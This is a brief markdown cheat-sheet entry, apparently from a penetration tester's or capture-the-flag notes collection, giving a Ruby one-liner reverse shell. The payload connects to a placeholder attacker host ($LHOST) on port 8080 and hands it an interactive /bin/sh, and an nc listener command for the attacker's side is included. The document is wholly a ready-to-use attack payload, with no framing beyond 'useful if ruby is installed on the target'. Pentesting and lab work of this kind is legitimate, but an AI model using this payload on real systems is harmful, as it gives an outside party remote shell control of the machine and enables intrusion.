# Ruby Reverse Shell

A standard reverse shell payload using ruby.

Used on: **<Machine>**

## One-liner

<!-- cmd: linux -->
```bash
ruby -rsocket -e'f=TCPSocket.open("$LHOST",8080).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```

## Listener

<!-- cmd: linux -->
```bash
nc -lvnp 8080
```

## Notes

- Useful if ruby is installed on the target.
